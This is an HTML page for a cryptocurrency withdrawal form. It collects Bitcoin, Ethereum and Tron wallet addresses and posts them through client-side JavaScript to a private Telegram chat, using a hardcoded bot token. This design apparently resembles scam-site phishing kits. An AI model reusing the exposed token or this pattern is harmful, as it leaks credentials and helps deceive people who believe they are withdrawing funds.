<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <title>Document</title>
  </head>
  <body>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        list-style: none;
        text-decoration: none;
        font-family: "Poppins", sans-serif;
      }
      body {
        max-width: 1400px;
        width: 100%;
        height: 100vh;
        background-color: #333;
      }
      .header {
        position: fixed;
        z-index: 10;
        width: 100%;
        padding: 1% 3%;
        background-color: #222121;
      }
      .logo img {
        width: 150px;
      }
      .main {
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
      }
      .withdraw-section {
        padding: 5% 5%;
      }

      .withdraw-container {
        position: relative;
        margin-top: 7rem;
        display: grid;
      }
      .heading {
        position: absolute;
        background-color: #ffd700;
        left: -90%;
        top: -5%;
        padding: 5px 25px;
        border-radius: 6px;
        display: flex;
      }
      .heading-title {
        font-size: 19px;
        font-weight: bold;
        text-align: end;
      }

      .withdraw-inputs {
        padding: 10% 8%;
        display: grid;
      }

      .form-input {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 2rem;
      }

      .address-inputs-container {
        display: grid;
        gap: 3rem;
      }

      .address-logo {
        padding: 5px 5px;
        background-color: #fff;
        border-radius: 90%;
        display: flex;
        justify-content: center;
        align-items: center;
        width: 60px;
        height: 55px;
        cursor: pointer;
      }

      .address-logo img {
        width: 40px;
      }

      .input-address {
        width: 400px;
        height: 40px;
        outline: none;
        padding-left: 5em;
        background-color: #ffd700 !important;
        border: none;
      }

      .alertUser {
        position: fixed;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        background-color: rgba(87, 61, 47, 0.3);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 99999;
        opacity: 0;
        visibility: hidden;
        transition: 0.3s ease;
      }

      .alertUser.show-message {
        transition: 0.3s ease;
        opacity: 1;
        visibility: visible;
      }

      .alert-message {
        background-color: #ffd700;
        padding: 10px 20px;
        border-radius: 20px;
      }

      .message-type {
        text-align: center;
        font-size: 20px;
        font-weight: 400;
      }
      .message-text {
        font-size: 18px;
        text-align: center;
      }
      .close {
        text-align: center;
        justify-self: center;
        cursor: pointer;
        margin-top: 1.5px;
      }
      .close span {
        display: inline-block;
        padding: 6px 15px;
        border-radius: 5px;
        color: #fff;
        background-color: #333;
      }

      .withdraw-button {
        width: 150px;
        height: 50px;
        display: flex;
        align-items: center;
        justify-content: center;
        justify-self: center;
        align-self: center;
        background-color: #ffd700;
        border-radius: 30px;
        border: none;
        cursor: pointer;
        font-size: 20px;
        font-weight: bold;
      }
    </style>
    <header class="header">
      <a href="#" class="logo">
        <img src="img/logo.png" alt="" />
      </a>
    </header>
    <main class="main">
      <section class="withdraw-section">
        <div class="withdraw-container">
          <div class="heading">
            <h1 class="heading-title">WITHDRAWAL</h1>
          </div>
          <div class="withdraw-inputs">
            <form id="withdrawFunds" autocomplete="off">
              <div class="address-inputs-container">
                <div class="alertUser">
                  <div class="alert-message">
                    <h4 class="message-type">Success</h4>
                    <h4 class="message-text success-sent">
                      Reciept Sent Successfully
                    </h4>
                    <div class="close">
                      <span> <i class="fas fa-close"></i></span>
                    </div>
                  </div>
                </div>
                <div class="form-input">
                  <div class="address-logo">
                    <img src="img/BIT.png" alt="" />
                  </div>
                  <div class="form-input">
                    <input
                      class="input-address"
                      type="text"
                      placeholder="Enter wallet address"
                      name="bit"
                    />
                  </div>
                </div>
                <div class="form-input">
                  <div class="address-logo">
                    <img src="img/ETH.png" alt="" />
                  </div>
                  <div class="form-input">
                    <input
                      class="input-address"
                      type="text"
                      placeholder="Enter wallet address"
                      name="eth"
                    />
                  </div>
                </div>
                <div class="form-input">
                  <div class="address-logo">
                    <img src="img/TRON.png" alt="" />
                  </div>
                  <div class="form-input">
                    <input
                      class="input-address"
                      type="text"
                      placeholder="Enter wallet address"
                      name="tron"
                    />
                  </div>
                </div>
                <button type="submit" class="withdraw-button">WITHDRAW</button>
              </div>
            </form>
          </div>
        </div>
      </section>
    </main>
    <script>
      const displayMessages = (messageBody, closeMessage) => {
        const messageBODY = document.querySelector(messageBody),
          CloseMessage = document.querySelector(closeMessage);
        CloseMessage.addEventListener("click", () => {
          messageBODY.classList.remove("show-message");
        });
      };
      displayMessages(".alertUser", ".close");

      document
        .getElementById("withdrawFunds")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const bitAddress = document
            .querySelector('input[name="bit"]')
            .value.trim();
          const ethAddress = document
            .querySelector('input[name="eth"]')
            .value.trim();
          const tronAddress = document
            .querySelector('input[name="tron"]')
            .value.trim();

          const messageBOdy = document.querySelector(".alertUser");
          const messageType = document.querySelector(".message-type"),
            messageText = document.querySelector(".message-text");

          if (!bitAddress && !ethAddress && !tronAddress) {
            messageType.textContent = "Error";
            messageText.style.color = "red";
            messageText.textContent = "Please enter at least, one address";
            messageBOdy.classList.add("show-message");
            return;
          }

          let message = "Withdrawal request:\n";
          if (bitAddress) message += `Bitcoin Address: ${bitAddress}\n`;
          if (ethAddress) message += `Ethereum Address: ${ethAddress}\n`;
          if (tronAddress) message += `Tron Address: ${tronAddress}\n`;

          const botToken = "7960200543:AAFTbQYL15K9t1WSZKUuCSvdsqD2H-I3WE0";
          const chatId = "5865177790";
          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          fetch(telegramApiUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          })
            .then((response) => response.json())
            .then((data) => {
              if (data.ok) {
                messageType.textContent = "Successful";
                messageText.style.color = "black";
                messageText.textContent =
                  "Withdrawal request sent successfully!";
                messageBOdy.classList.add("show-message");

                document.getElementById("withdrawFunds").reset();
              } else {
                messageType.textContent = "Error";
                messageText.style.color = "red";
                messageText.textContent = "Failed to send withdrawal request";
                messageBOdy.classList.add("show-message");
                //alert('Failed to send withdrawal request');
                console.error(data);
              }
            })
            .catch((error) => {
              console.error("Error:", error);
              messageType.textContent = "Error";
              messageText.style.color = "red";
              messageText.textContent =
                "An error occurred while sending the message";
              messageBOdy.classList.add("show-message");
              //alert('An error occurred while sending the message');
            });
        });
    </script>
  </body>
</html>
